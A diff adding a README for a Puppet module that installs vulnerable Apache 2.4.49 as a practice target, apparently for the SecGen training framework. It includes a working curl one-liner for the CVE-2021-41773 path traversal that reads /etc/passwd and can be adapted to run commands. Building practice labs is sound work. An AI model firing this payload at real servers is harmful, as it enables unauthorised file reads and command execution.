@@ -1,0 +1,37 @@
+Tested on Debian GNU/Linux 11 (bullseye).
+STATUS: Fully working.
+
+
+Simple Puppet module to install and configure the vulnerable Apache 2.4.49 to help individuals practice their exploitation skills. 
+Additionally, this module will hopefully be implimented into SecGen (https://github.com/cliffe/SecGen).
+
+
+Quick way to exploit:
+    - curl -s --path-as-is -d "echo Content-Type: text/plain; echo;" "<TARGET IP ADDRESS>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        Can change '/etc/passwd' to a command or anything else really.
+
+File Locations:
+
+    Installer Location:
+        - /opt/Apache_2.4.49/
+
+    Binary Location:
+        - /usr/local/apache2/bin
+
+    Config location:
+        - /usr/local/apache2/conf
+
+    Web Pages:
+        - /usr/local/apache2/htdocs
+
+    Service file location:
+        - /etc/systemd/system/httpd.service
+
+Exploit Link:
+https://www.exploit-db.com/exploits/50383
+
+Sources/Links:
+https://www.linuxfromscratch.org/blfs/view/svn/server/apache.html - Proved to be helpful but also very unhelpful.
+https://www.exploit-db.com/apps/1edb1895661473ea530209e29b83a982-httpd-2.4.49.tar.gz - Vulnerable version of the Application.
+https://nvd.nist.gov/vuln/detail/CVE-2021-41773 - CVE details.
+https://github.com/cliffe/SecGen - SecGen by Cliffe Schreuders.
